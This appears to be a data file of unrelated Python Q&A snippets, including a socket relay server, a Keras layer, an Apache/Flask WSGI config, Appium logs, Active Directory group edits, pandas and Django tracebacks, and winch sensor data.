"A -- -- -- -- -- - > server < -- -- -- -- -- - B # they both connect the server firstA -- '' hello '' -- > server # A sends a message to server server -- '' hello '' -- > B # the server sends the message to B # server.pyimport socket , timefrom threading import Threadsocket = socket.socket ( socket.AF_INET , socket.SOCK_STREAM ) socket.bind ( ( `` , 5555 ) ) socket.listen ( 5 ) buf = `` i = 0def handler ( client , i ) : global buf print 'Hello ! ' , client , i if i == 0 : # client A , who sends data to server while True : req = client.recv ( 1000 ) buf = str ( req ) .strip ( ) # removes end of line print 'Received from Client A : % s ' % buf elif i == 1 : # client B , who receives data sent to server by client A while True : if buf ! = `` : client.send ( buf ) buf = `` time.sleep ( 0.1 ) while True : # very simple concurrency : accept new clients and create a Thread for each one client , address = socket.accept ( ) print `` { } connected '' .format ( address ) Thread ( target=handler , args= ( client , i ) ) .start ( ) i += 1 ( '203.0.113.0 ' , 50340 ) connected # client A , router translated port to 50340 ( '203.0.113.0 ' , 52750 ) connected # same public IP , client B , router translated port to 52750"
"class MyDict ( dict ) : def __getitem__ ( self , key ) : return super ( ) [ key ]"
"class FusionLayer ( Layer ) : def __init__ ( self , output_dim , **kwargs ) : self.output_dim = output_dim super ( FusionLayer , self ) .__init__ ( **kwargs ) def build ( self , input_shape ) : input_dim = input_shape [ 1 ] [ 1 ] initial_weight_value = np.random.random ( ( input_dim , self.output_dim ) ) self.W = K.variable ( initial_weight_value ) self.b = K.zeros ( ( input_dim , ) ) self.trainable_weights = [ self.W , self.b ] def call ( self , inputs , mask=None ) : y_global = inputs [ 0 ] y_mid = inputs [ 1 ] # the code below should be modified output = K.dot ( K.concatenate ( [ y_global , y_mid ] ) , self.W ) output += self.b return self.activation ( output ) def get_output_shape_for ( self , input_shape ) : assert input_shape and len ( input_shape ) == 2 return ( input_shape [ 0 ] , self.output_dim )"
def contains_text_of_interest ( line ) : r = re.compile ( r '' foo\dbar\d '' ) return r.match ( line ) def parse_file ( fname ) : for line in open ( fname ) : if contains_text_of_interest ( line ) : # Do something interesting
"dict.list [ 0 ] .id { `` dict '' : `` list '' : [ { `` id '' : `` my cell value '' } ] } one.two [ 0 ] .three [ 0 ] .four.five [ 0 ] .six def add_branch ( tree , vector , value ) : key = vector [ 0 ] tree [ key ] = value \ if len ( vector ) == 1 \ else add_branch ( tree [ key ] if key in tree else { } , vector [ 1 : ] , value ) return treefile = Worksheet ( filePath , sheet ) .readRow ( ) rowList = [ ] for row in file : rowObj = { } for colName , rowValue in row.items ( ) : rowObj.update ( add_branch ( rowObj , colName.split ( `` . `` ) , rowValue ) ) rowList.append ( rowObj ) return rowList import re , jsondef branch ( tree , vector , value ) : `` '' '' Used to convert JS style notation ( e.g dict.another.array [ 0 ] .id ) to a python object Originally based on https : //stackoverflow.com/a/47276490/2903486 `` '' '' # Convert Boolean if isinstance ( value , str ) : value = value.strip ( ) if value.lower ( ) in [ 'true ' , 'false ' ] : value = True if value.lower ( ) == `` true '' else False # Convert JSON try : value = json.loads ( value ) except : pass key = vector [ 0 ] arr = re.search ( '\ [ ( [ 0-9 ] + ) \ ] ' , key ) if arr : arr = arr.group ( 0 ) key = key.replace ( arr , `` ) arr = arr.replace ( ' [ ' , `` ) .replace ( ' ] ' , `` ) newArray = False if key not in tree : tree [ key ] = [ ] tree [ key ] .append ( value \ if len ( vector ) == 1 \ else branch ( { } if key in tree else { } , vector [ 1 : ] , value ) ) else : isInArray = False for x in tree [ key ] : if x.get ( vector [ 1 : ] [ 0 ] , False ) : isInArray = x [ vector [ 1 : ] [ 0 ] ] if isInArray : tree [ key ] .append ( value \ if len ( vector ) == 1 \ else branch ( { } if key in tree else { } , vector [ 1 : ] , value ) ) else : tree [ key ] .append ( value \ if len ( vector ) == 1 \ else branch ( { } if key in tree else { } , vector [ 1 : ] , value ) ) if len ( vector ) == 1 and len ( tree [ key ] ) == 1 : tree [ key ] = value.split ( `` , '' ) else : tree [ key ] = value \ if len ( vector ) == 1 \ else branch ( tree [ key ] if key in tree else { } , vector [ 1 : ] , value ) return tree file = [ { `` one.array [ 0 ] .dict.arrOne [ 0 ] '' : `` 1,2,3 '' , `` one.array [ 0 ] .dict.arrTwo [ 0 ] '' : `` 4,5,6 '' } ] rowList = [ ] for row in file : rowObj = { } for colName , rowValue in row.items ( ) : rowObj.update ( add_branch ( rowObj , colName.split ( `` . `` ) , rowValue ) ) rowList.append ( rowObj ) return rowList [ { `` one '' : { `` array '' : [ { `` dict '' : { `` arrOne '' : [ `` 1 '' , `` 2 '' , `` 3 '' ] } } , { `` dict '' : { `` arrTwo '' : [ `` 4 '' , `` 5 '' , `` 6 '' ] } } ] } } ] [ { `` one '' : { `` array '' : [ { `` dict '' : { `` arrOne '' : [ `` 1 '' , `` 2 '' , `` 3 '' ] , `` arrTwo '' : [ `` 4 '' , `` 5 '' , `` 6 '' ] } } ] } } ]"
"calling a host function ( `` std : :pow < int , int > `` ) from a __device__/__global__ function ( `` _calc_psd '' ) is not allowed"
> > > 1//.19.0 > > > 1//-.1-10.0
df1 = value0 a1 b2 cdf2 = value0 d1 e result = value0 a1 b2 c3 d4 e result = value0 b1 a2 c3 d4 e
"Combination : Product : 3 , 3 9 3 , 2 6 3 , 1 3 2 , 2 4 2 , 1 2 1 , 1 1 Combination : Product : 3 , 3 9 2 , 3 6 2 , 2 4 1 , 3 3 1 , 2 2 1 , 1 1 def maxpal ( ) : for i in reversed ( range ( 100,1000 ) ) : # Since we only want unique combinations , we only # need to iterate up to i for j in reversed ( range ( 100 , i ) ) : if str ( i*j ) == str ( i*j ) [ : :-1 ] : yield i*jprint max ( maxpal ( ) )"
"WSGIApplicationGroup % { GLOBAL } < VirtualHost *:8080 > # -- -- Configure VirtualHost Defaults -- -- ServerAdmin jsmith @ whoi.edu DocumentRoot /home/bitnami/public_html/http < Directory / > Options FollowSymLinks AllowOverride None < /Directory > < Directory /home/bitnami/public_html/http/ > Options Indexes FollowSymLinks MultiViews AllowOverride None Order allow , deny Allow from all < /Directory > # -- -- Configure WSGI Listener ( s ) -- -- WSGIDaemonProcess flaskapp user=www-data group=www-data processes=1 threads=5 WSGIScriptAlias /flasktest1 /home/bitnami/public_html/wsgi/flasktest1.wsgi < Directory /home/bitnami/public_html/http/flasktest1 > WSGIProcessGroup flaskapp WSGIApplicationGroup % { GLOBAL } Order deny , allow Allow from all < /Directory > # -- -- Configure Logging -- -- ErrorLog /home/bitnami/public_html/logs/error.logLogLevel warnCustomLog /home/bitnami/public_html/logs/access.log combined # ! /usr/bin/pythonfrom flask import Flaskimport nltkapp = Flask ( __name__ ) @ app.route ( '/ ' ) def home ( ) : return `` '' '' < html > < h2 > Hello from Test Application 1 < /h2 > < /html > '' '' '' @ app.route ( '/ < foo > ' ) def foo ( foo ) : return `` '' '' < html > < h2 > Test Application 1 < /2 > < h3 > / % s < /h3 > < /html > '' '' '' % fooif __name__ == '__main__ ' : `` Are we in the __main__ scope ? Start test server . '' app.run ( host= ' 0.0.0.0 ' , port=5000 , debug=True )"
"class CsrfExtension ( jinja2.ext.Extension ) : r '' '' '' Adds a { % csrf % } tag to Jinja. `` '' '' tags = set ( [ 'csrf ' ] ) template = ' < input type= '' hidden '' name= '' csrfmiddlewaretoken '' value= '' % s '' > ' def parse ( self , parser ) : token = next ( parser.stream ) lineno = token.lineno return self.call_method ( '_render_csrf ' , lineno=lineno ) def _render_csrf ( self , value , name , *args , **kwargs ) : csrf_token = somehow_get_variable ( 'csrf_token ' ) return jinja2.Markup ( self.template % csrf_token ) < ! DOCTYPE html > < html > < body > < h1 > This is a Test < /h1 > { % csrf % } < /body > < /html > SyntaxError at /invalid syntax ( foo.jinja , line 7 )"
"self.driver.zoom ( self.element , percent ) File `` /usr/local/lib/python2.7/site-packages/appium/webdriver/webdriver.py '' , line 308 , in zoomself.execute_script ( 'mobile : pinchOpen ' , opts ) File `` /usr/local/lib/python2.7/site-packages/selenium/webdriver/remote/webdriver.py '' , line 461 , in execute_script { 'script ' : script , 'args ' : converted_args } ) [ 'value ' ] File `` /usr/local/lib/python2.7/site-packages/selenium/webdriver/remote/webdriver.py '' , line 233 , in executeself.error_handler.check_response ( response ) File `` /usr/local/lib/python2.7/site-packages/appium/webdriver/errorhandler.py '' , line 29 , in check_responseraise wdeWebDriverException : Message : Method has not yet been implemented loc = self.element.locationprint locxx , yy = loc [ `` x '' ] , loc [ `` y '' ] xx=700action1 = TouchAction ( self.driver ) action1.long_press ( x=xx , y=yy ) .move_to ( x=0 , y=1000 ) .release ( ) action2 = TouchAction ( self.driver ) action2.long_press ( x=xx , y=yy ) .move_to ( x=0 , y=-1000 ) .release ( ) m_action = MultiAction ( self.driver ) m_action.add ( action1 , action2 ) m_action.perform ( ) [ AndroidBootstrap ] [ BOOTSTRAP LOG ] [ debug ] Got data from client : { `` cmd '' : '' action '' , '' action '' : '' element : getLocation '' , '' params '' : { `` elementId '' : '' 83 '' } } [ AndroidBootstrap ] [ BOOTSTRAP LOG ] [ debug ] Got command of type ACTION [ AndroidBootstrap ] [ BOOTSTRAP LOG ] [ debug ] Got command action : getLocation [ AndroidBootstrap ] [ BOOTSTRAP LOG ] [ debug ] Returning result : { `` status '' :0 , '' value '' : { `` x '' :0 , '' y '' :1225 } } [ debug ] [ AndroidBootstrap ] Received command result from bootstrap [ MJSONWP ] Responding to client with driver.getLocation ( ) result : { `` x '' :0 , '' y '' :1225 } [ HTTP ] < -- GET /wd/hub/session/c1a4d17f-0dc6-4445-bfad-776ec65bddb5/element/83/location 200 26 ms - 88 [ HTTP ] -- > POST /wd/hub/session/c1a4d17f-0dc6-4445-bfad-776ec65bddb5/touch/multi/perform { `` sessionId '' : '' c1a4d17f-0dc6-4445-bfad-776ec65bddb5 '' , '' actions '' : [ [ { `` action '' : '' longPress '' , '' options '' : { `` y '' :1225 , '' x '' :700 , '' duration '' :1000 } } , { `` action '' : '' moveTo '' , '' options '' : { `` y '' :1000 , '' x '' :0 } } , { `` action '' : '' release '' , '' options '' : { } } ] , [ { `` action '' : '' longPress '' , '' options '' : { `` y '' :1225 , '' x '' :700 , '' duration '' :1000 } } , { `` action '' : '' moveTo '' , '' options '' : { `` y '' : -1000 , '' x '' :0 } } , { `` action '' : '' release '' , '' options '' : { } } ] ] } [ MJSONWP ] Calling AppiumDriver.performMultiAction ( ) with args : [ [ [ { `` action '' : '' longPress '' , '' o ... [ debug ] [ AndroidBootstrap ] Sending command to android : { `` cmd '' : '' action '' , '' action '' : '' performMultiPointerGesture '' , '' params '' : { `` actions '' : [ [ { `` action '' : '' longPress '' , '' time '' :0.005 , '' touch '' : { `` y '' :1225 , '' x '' :700 , '' duration '' :1000 } } , { `` action '' : '' moveTo '' , '' time '' :0.01 , '' touch '' : { `` y '' :2225 , '' x '' :700 } } ] , [ { `` action '' : '' longPress '' , '' time '' :0.005 , '' touch '' : { `` y '' :1225 , '' x '' :700 , '' duration '' :1000 } } , { `` action '' : '' moveTo '' , '' time '' :0.01 , '' touch '' : { `` y '' :225 , '' x '' :700 } } ] ] } } [ AndroidBootstrap ] [ BOOTSTRAP LOG ] [ debug ] Got data from client : { `` cmd '' : '' action '' , '' action '' : '' performMultiPointerGesture '' , '' params '' : { `` actions '' : [ [ { `` action '' : '' longPress '' , '' time '' :0.005 , '' touch '' : { `` y '' :1225 , '' x '' :700 , '' duration '' :1000 } } , { `` action '' : '' moveTo '' , '' time '' :0.01 , '' touch '' : { `` y '' :2225 , '' x '' :700 } } ] , [ { `` action '' : '' longPress '' , '' time '' :0.005 , '' touch '' : { `` y '' :1225 , '' x '' :700 , '' duration '' :1000 } } , { `` action '' : '' moveTo '' , '' time '' :0.01 , '' touch '' : { `` y '' :225 , '' x '' :700 } } ] ] } } [ AndroidBootstrap ] [ BOOTSTRAP LOG ] [ debug ] Got command of type ACTION [ AndroidBootstrap ] [ BOOTSTRAP LOG ] [ debug ] Got command action : performMultiPointerGesture [ AndroidBootstrap ] [ BOOTSTRAP LOG ] [ debug ] Returning result : { `` status '' :0 , '' value '' : '' OK '' } [ debug ] [ AndroidBootstrap ] Received command result from bootstrap [ MJSONWP ] Responding to client with driver.performMultiAction ( ) result : `` OK '' [ HTTP ] < -- POST /wd/hub/session/c1a4d17f-0dc6-4445-bfad-776ec65bddb5/touch/multi/perform 200 133 ms - 76 [ HTTP ] -- > DELETE /wd/hub/session/c1a4d17f-0dc6-4445-bfad-776ec65bddb5 { }"
"from win32com.client import GetObjectgrp = GetObject ( `` LDAP : //CN=groupname , OU=groups , DC=blah , DC=local '' ) grp.Add ( `` LDAP : //CN=username , OU=users , DC=blah , DC=local '' ) # successfully adds a user to the groupgrp.Remove ( `` LDAP : //CN=username , OU=users , DC=blah , DC=local '' ) # returns an error Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` < COMObject LDAP : //CN=groupname , OU=groups , DC=blah , DC=local > '' , line 2 , in Removepywintypes.com_error : ( -2147352567 , 'Exception occurred . ' , ( 0 , None , None , None , 0 , -2147024891 ) , None ) usr = GetObject ( `` LDAP : //CN=user , OU=users , DC=blah , DC=local '' ) grp.Remove ( usr ) import active_directory as adgrp = ad.find_group ( `` groupname '' ) usr = ad.find_user ( `` username '' ) grp.remove ( usr.path ( ) ) Traceback ( most recent call last ) : File `` C : \Python33\lib\site-packages\active_directory.py '' , line 799 , in __getattr__ attr = getattr ( self.com_object , name ) AttributeError : 'PyIADs ' object has no attribute 'group'During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` C : \Python33\lib\site-packages\active_directory.py '' , line 802 , in __getattr__ attr = self.com_object.Get ( name ) pywintypes.com_error : ( -2147463155 , 'OLE error 0x8000500d ' , ( 0 , 'Active Directory ' , 'The directory property can not be found in the cache.\r\n ' , None , 0 , -2147463155 ) , None ) During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` C : \Python33\lib\site-packages\active_directory.py '' , line 1081 , in remove self.group.Remove ( dn ) File `` C : \Python33\lib\site-packages\active_directory.py '' , line 804 , in __getattr__ raise AttributeErrorAttributeError import active_directory as aduser = ad.find_user ( `` username '' ) group = ad.find_group ( `` groupname '' ) group.remove ( user.path ( ) ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` < COMObject LDAP : //CN=groupname , OU=groups , DC=blah , DC=local > '' , line 2 , in removepywintypes.com_error : ( -2147352567 , 'Exception occurred . ' , ( 0 , None , None , None , 0 , -2147024891 ) , None )"
"class Person : def __init__ ( self , name ) : self.name=namebob = Person ( 'Bob Smith ' ) print ( bob.name ) class Person : def __init__ ( self , name ) : self.name=name @ property def name ( self ) : `` name property docs '' print ( 'fetch ... ' ) return self.namebob = Person ( 'Bob Smith ' ) print ( bob.name ) Traceback ( most recent call last ) : File `` C : \ ... , in run_code exec ( code_obj , self.user_global_ns , self.user_ns ) File `` < ipython-input-25-62e9a426d2a9 > '' , line 2 , in < module > bob = Person ( 'Bob Smith ' ) File `` < ipython-input-24-6c55f4b7326f > '' , line 4 , in __init__ self.name=name AttributeError : ca n't set attribute class Person : def __init__ ( self , name ) : self._name=name # Changed name to _name @ property def name ( self ) : `` name property docs '' print ( 'fetch ... ' ) return self._name # Changed name to _namebob = Person ( 'Bob Smith ' ) print ( bob.name ) class Person : def __init__ ( self , name ) : self.name=name # changed to name @ property def _name ( self ) : # Changed to _name `` name property docs '' print ( 'fetch ... ' ) return self.name # changed to namebob = Person ( 'Bob Smith ' ) print ( bob.name ) @ _name.setterdef _name ( self , value ) : `` name property setter '' print ( 'change ... ' ) self.name=value @ _name.deleterdef _name ( self ) : print ( 'remove ' ) del self.namebob = Person ( 'Bob Smith ' ) print ( bob.name ) bob.name = 'Bobby Smith'print ( bob.name ) del bob.name"
"> > > def f ( a , *args , c ) : File `` < stdin > '' , line 1 def f ( a , *args , c ) : ^SyntaxError : invalid syntax def f ( a , *b , c=5 , **kwargs ) :"
"import pandas as pdimport numpy as npdf = pd.DataFrame ( { 'today ' : [ [ ' a ' , ' b ' , ' c ' ] , [ ' a ' , ' b ' ] , [ ' b ' ] ] , 'yesterday ' : [ [ ' a ' , ' b ' ] , [ ' a ' ] , [ ' a ' ] ] } ) today yesterday0 [ ' a ' , ' b ' , ' c ' ] [ ' a ' , ' b ' ] 1 [ ' a ' , ' b ' ] [ ' a ' ] 2 [ ' b ' ] [ ' a ' ] ... etc additions = df.apply ( lambda row : np.setdiff1d ( row.today , row.yesterday ) , axis=1 ) removals = df.apply ( lambda row : np.setdiff1d ( row.yesterday , row.today ) , axis=1 )"
"> > > import numpy as np > > > x=np.array ( [ 105,79,196,53,151,176,59,202,249,0,207,6 ] , dtype=np.uint8 ) > > > np.fromstring ( x.tostring ( ) , ' < h ' ) array ( [ 20329 , 13764 , -20329 , -13765 , 249 , 1743 ] , dtype=int16 )"
"total_seconds = PyNumber_TrueDivide ( total_microseconds , one_million ) ;"
bb/__init__.pyb/cb/c/__init__.pyb/c/db/c/d/__init__.py import bimport b.cimport b.c.dprint b.c.d import bprint b.c.d
offset = Week ( weekday=0 ) if d1-3*offset < d2 : pass
"> > > import pint > > > ureg = pint.UnitRegistry ( ) > > > Q = ureg.Quantity > > > a = Q ( 5 , 'm/s ' ) > > > a < Quantity ( 5 , 'meter / second ' ) > > > > a.to ( 'ft/s ' ) < Quantity ( 16.404199475065617 , 'foot / second ' ) > > > > ureg.define ( 'percent = dimensionless * 100 = pct ' ) > > > a = Q ( 5 , 'pct ' ) > > > a < Quantity ( 5 , 'percent ' ) > > > > a.to ( 'dimensionless ' ) Traceback ( most recent call last ) : File `` < pyshell # 31 > '' , line 1 , in < module > a.to ( 'dimensionless ' ) File `` C : \Python35\python-3.5.1.amd64\lib\site-packages\pint\quantity.py '' , line 263 , in to magnitude = self._convert_magnitude_not_inplace ( other , *contexts , **ctx_kwargs ) File `` C : \Python35\python-3.5.1.amd64\lib\site-packages\pint\quantity.py '' , line 231 , in _convert_magnitude_not_inplace return self._REGISTRY.convert ( self._magnitude , self._units , other ) File `` C : \Python35\python-3.5.1.amd64\lib\site-packages\pint\unit.py '' , line 1026 , in convert return self._convert ( value , src , dst , inplace ) File `` C : \Python35\python-3.5.1.amd64\lib\site-packages\pint\unit.py '' , line 1042 , in _convert src_dim = self._get_dimensionality ( src ) File `` C : \Python35\python-3.5.1.amd64\lib\site-packages\pint\unit.py '' , line 813 , in _get_dimensionality self._get_dimensionality_recurse ( input_units , 1.0 , accumulator ) File `` C : \Python35\python-3.5.1.amd64\lib\site-packages\pint\unit.py '' , line 837 , in _get_dimensionality_recurse self._get_dimensionality_recurse ( reg.reference , exp2 , accumulator ) File `` C : \Python35\python-3.5.1.amd64\lib\site-packages\pint\unit.py '' , line 835 , in _get_dimensionality_recurse reg = self._units [ self.get_name ( key ) ] KeyError : ``"
"High Low Open Close Volume Adj Close year pct_daymonth day 1 1 NaN NaN NaN NaN NaN NaN 2010.0 0.0000002 7869.853149 7718.482498 7779.655014 7818.089966 7.471689e+07 7818.089966 2010.0 0.0078263 7839.965652 7719.758224 7775.396255 7777.940002 8.185879e+07 7777.940002 2010.0 0.0025824 7747.175260 7624.540007 7691.152083 7686.288672 1.018877e+08 7686.288672 2010.0 -0.0007445 7348.487095 7236.742135 7317.313616 7287.688546 1.035424e+08 7287.688546 2010.0 -0.002499 ... ... ... ... ... ... ... ... ... ... 12 27 7849.846680 7760.222526 7810.902051 7798.639258 4.678145e+07 7798.639258 2009.5 -0.00083328 7746.209996 7678.152204 7713.497907 7710.449358 4.187133e+07 7710.449358 2009.5 0.00057829 7357.001540 7291.827806 7319.393874 7338.938345 4.554891e+07 7338.938345 2009.5 0.00332130 7343.726938 7276.871507 7322.123779 7302.545316 3.967812e+07 7302.545316 2009.5 -0.00031231 NaN NaN NaN NaN NaN NaN 2009.5 0.000000 full_dates = pd.date_range ( start , end ) data = data.reindex ( full_dates ) data [ 'year ' ] = data.index.yeardata [ 'month ' ] = data.index.monthdata [ 'week ' ] = data.index.weekdata [ 'day ' ] = data.index.daydata.set_index ( 'month ' , append=True , inplace=True ) data.set_index ( 'week ' , append=True , inplace=True ) data.set_index ( 'day ' , append=True , inplace=True ) df = data.groupby ( [ 'month ' , 'day ' ] ) .mean ( )"
def pytest_configure ( config ) : try : import foo except : pytest.skip ( `` skipping when foo is not installed '' ) def test_foo ( ) assert foo.is_enabled ( ) # < -- foo is undefined here
> < function mro >
conda activate my-venvconda install pipconda install foopip install bar
"class HowToApply ( models.Model ) : title = models.CharField ( max_length=500 , blank=True , null=True ) notice = models.TextField ( blank=True , null=True ) description = models.TextField ( blank=True , null=True ) active = models.BooleanField ( default=None ) image = models.FileField ( upload_to='numeric/img/ % Y ' , blank=True , null=True ) mobile_image = models.FileField ( upload_to='mobile/img/ % Y ' , blank=True , null=True ) sequence_number = models.IntegerField ( unique=True ) from django.conf.urls import patterns , include , urlfrom django.views.generic import RedirectView , TemplateView , ListView , CreateViewfrom numeric import models , forms , viewsfrom honeypot.decorators import check_honeypotfrom numeric.views import CheckDeviceViewfrom itertools import chainurlpatterns = patterns ( `` , url ( r'^academy/howtoapply/ $ ' , ListView.as_view ( queryset = list ( chain ( models.HowToApply.objects.filter ( active=True ) .order_by ( 'sequence_number ' ) , models.AcademyAdmin.objects.all ( ) ) ) , template_name = 'numeric/apply.html ' ) , name='apply ' ) , Traceback ( most recent call last ) : File `` manage.py '' , line 10 , in < module > execute_from_command_line ( sys.argv ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/management/__init__.py '' , line 350 , in execute_from_command_line utility.execute ( ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/management/__init__.py '' , line 342 , in execute self.fetch_command ( subcommand ) .run_from_argv ( self.argv ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/management/base.py '' , line 348 , in run_from_argv self.execute ( *args , **cmd_options ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/management/base.py '' , line 398 , in execute self.check ( ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/management/base.py '' , line 426 , in check include_deployment_checks=include_deployment_checks , File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/checks/registry.py '' , line 75 , in run_checks new_errors = check ( app_configs=app_configs ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/checks/urls.py '' , line 10 , in check_url_config return check_resolver ( resolver ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/checks/urls.py '' , line 19 , in check_resolver for pattern in resolver.url_patterns : File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/utils/functional.py '' , line 33 , in __get__ res = instance.__dict__ [ self.name ] = self.func ( instance ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/urlresolvers.py '' , line 417 , in url_patterns patterns = getattr ( self.urlconf_module , `` urlpatterns '' , self.urlconf_module ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/utils/functional.py '' , line 33 , in __get__ res = instance.__dict__ [ self.name ] = self.func ( instance ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/core/urlresolvers.py '' , line 410 , in urlconf_module return import_module ( self.urlconf_name ) File `` /usr/lib/python2.7/importlib/__init__.py '' , line 37 , in import_module __import__ ( name ) File `` /var/www/website_mig/project/urls.py '' , line 14 , in < module > ( r'^ ' , include ( 'numeric.urls ' ) ) , File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/conf/urls/__init__.py '' , line 52 , in include urlconf_module = import_module ( urlconf_module ) File `` /usr/lib/python2.7/importlib/__init__.py '' , line 37 , in import_module __import__ ( name ) File `` /var/www/website_mig/numeric/urls.py '' , line 144 , in < module > queryset = list ( chain ( models.HowToApply.objects.filter ( active=True ) .order_by ( 'sequence_number ' ) , models.AcademyAdmin.objects.all ( ) ) ) , File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/db/models/query.py '' , line 258 , in __iter__ self._fetch_all ( ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/db/models/query.py '' , line 1074 , in _fetch_all self._result_cache = list ( self.iterator ( ) ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/db/models/query.py '' , line 52 , in __iter__ results = compiler.execute_sql ( ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/db/models/sql/compiler.py '' , line 852 , in execute_sql cursor.execute ( sql , params ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/db/backends/utils.py '' , line 64 , in execute return self.cursor.execute ( sql , params ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/db/utils.py '' , line 95 , in __exit__ six.reraise ( dj_exc_type , dj_exc_value , traceback ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/db/backends/utils.py '' , line 64 , in execute return self.cursor.execute ( sql , params ) File `` /var/www/website_mig/venv/local/lib/python2.7/site-packages/django/db/backends/sqlite3/base.py '' , line 323 , in execute return Database.Cursor.execute ( self , query , params ) django.db.utils.OperationalError : no such table : numeric_howtoapply `"
"# ! /usr/bin/env python3from sys import argvfrom itertools import teefrom multiprocessing import Processdef my_generator ( ) : for i in range ( 5 ) : print ( i ) yield idef double ( x ) : return 2 * xdef compute_double_sum ( iterable ) : s = sum ( map ( double , iterable ) ) print ( s ) def square ( x ) : return x * xdef compute_square_sum ( iterable ) : s = sum ( map ( square , iterable ) ) print ( s ) g1 , g2 = tee ( my_generator ( ) , 2 ) try : processing_type = argv [ 1 ] except IndexError : processing_type = `` no_multi '' if processing_type == `` multi '' : p1 = Process ( target=compute_double_sum , args= ( g1 , ) ) p2 = Process ( target=compute_square_sum , args= ( g2 , ) ) print ( `` p1 starts '' ) p1.start ( ) print ( `` p2 starts '' ) p2.start ( ) p1.join ( ) print ( `` p1 finished '' ) p2.join ( ) print ( `` p2 finished '' ) else : compute_double_sum ( g1 ) compute_square_sum ( g2 ) $ ./test_tee.py 012342030 $ ./test_tee.py multip1 startsp2 starts01234200123430p1 finishedp2 finished"
"import numpy as npimport numexpr as nefrom numba import jit as numba_jitfrom parakeet import jit as para_jitdef numpy_complex_expr ( A , B ) : return ( A*B-4.1*A > 2.5*B ) def numexpr_complex_expr ( A , B ) : return ne.evaluate ( ' A*B-4.1*A > 2.5*B ' ) @ numba_jitdef numba_complex_expr ( A , B ) : return A*B-4.1*A > 2.5*B @ para_jitdef parakeet_complex_expr ( A , B ) : return A*B-4.1*A > 2.5*B"
"' '' The variables sensor_depth , winch_velocity and sample_time are assumed to be updated in the backgroundby another thread . ' '' import numpy as npfrom time import sleepx_data = [ ] y_data = [ ] running_size = 10while winch_is_running ( ) : if new_sample ( ) : x_data.append ( sample_time ) y_data.append ( sensor_depth ) # Get the slope for the entire procedure A = np.vstack ( [ x_data , np.ones ( len ( x_data ) ) ] ) overall_slope , offset = np.linalg.lstsq ( A , y_data ) [ 0 ] # Get the slope for a recent set of samples A = np.vstack ( [ x_data [ -1*running_size ] , np.ones ( running_size ) ] ) recent_slope , offset = np.linalg.lstsq ( A , y_data [ -1*running_size ] ) [ 0 ] if overall_slope - recent_slope > allowed_slope_error : stop_winch ( ) else : time.sleep ( .2 ) Temp Cond Sal DO DEPTH Turb Chlor 11/11/10 15:00:19 14.24 18.44 10.97 2.53 0.092 0.5 13.5 11/11/10 15:00:20 14.24 18.44 10.97 2.53 0.126 0.7 9.5 11/11/10 15:00:21 14.24 18.45 10.97 2.53 0.132 0.6 13.0 11/11/10 15:00:22 14.24 18.44 10.96 2.53 0.152 0.6 8.6 11/11/10 15:00:23 14.24 18.44 10.96 2.53 0.139 0.7 13.6 11/11/10 15:00:24 14.24 18.44 10.97 2.52 0.120 0.7 13.5 11/11/10 15:00:25 14.24 18.44 10.97 2.52 0.128 1.4 7.1 11/11/10 15:00:26 14.24 18.44 10.96 2.52 0.128 0.6 7.9 11/11/10 15:00:27 14.24 18.44 10.97 2.52 0.141 0.9 12.4 11/11/10 15:00:28 14.24 18.44 10.97 2.51 0.135 1.3 12.7 11/11/10 15:00:29 14.24 18.44 10.96 2.51 0.145 1.3 12.8 11/11/10 15:00:30 14.24 18.44 10.96 2.51 0.163 0.6 4.8 11/11/10 15:00:31 14.24 18.44 10.96 2.51 0.213 0.9 3.9 11/11/10 15:00:32 14.24 18.44 10.97 2.51 0.211 0.6 7.1 11/11/10 15:00:33 14.24 18.44 10.96 2.51 0.241 0.7 6.9 11/11/10 15:00:34 14.24 18.44 10.96 2.51 0.286 0.5 9.8 11/11/10 15:00:35 14.24 18.44 10.96 2.51 0.326 0.6 9.0 11/11/10 15:00:36 14.24 18.44 10.96 2.51 0.358 0.7 3.3 11/11/10 15:00:37 14.24 18.44 10.96 2.51 0.425 0.7 13.1 11/11/10 15:00:38 14.24 18.43 10.96 2.51 0.419 0.8 5.3 11/11/10 15:00:39 14.24 18.44 10.96 2.51 0.495 1.2 7.4 11/11/10 15:00:40 14.24 18.44 10.96 2.50 0.504 0.7 16.1 11/11/10 15:00:41 14.24 18.44 10.96 2.50 0.558 0.5 11.9 11/11/10 15:00:42 14.24 18.44 10.96 2.50 0.585 0.8 8.8 11/11/10 15:00:43 14.24 18.44 10.96 2.50 0.645 0.8 9.7 11/11/10 15:00:44 14.24 18.44 10.96 2.50 0.654 0.6 5.2 11/11/10 15:00:45 14.24 18.44 10.96 2.50 0.694 0.5 9.5 11/11/10 15:00:46 14.24 18.44 10.96 2.50 0.719 0.7 5.9 11/11/10 15:00:47 14.24 18.44 10.96 2.50 0.762 0.9 7.2 11/11/10 15:00:48 14.24 18.44 10.96 2.50 0.815 1.0 11.1 11/11/10 15:00:49 14.24 18.44 10.96 2.50 0.807 0.6 8.7 11/11/10 15:00:50 14.24 18.44 10.96 2.50 0.884 0.4 0.4 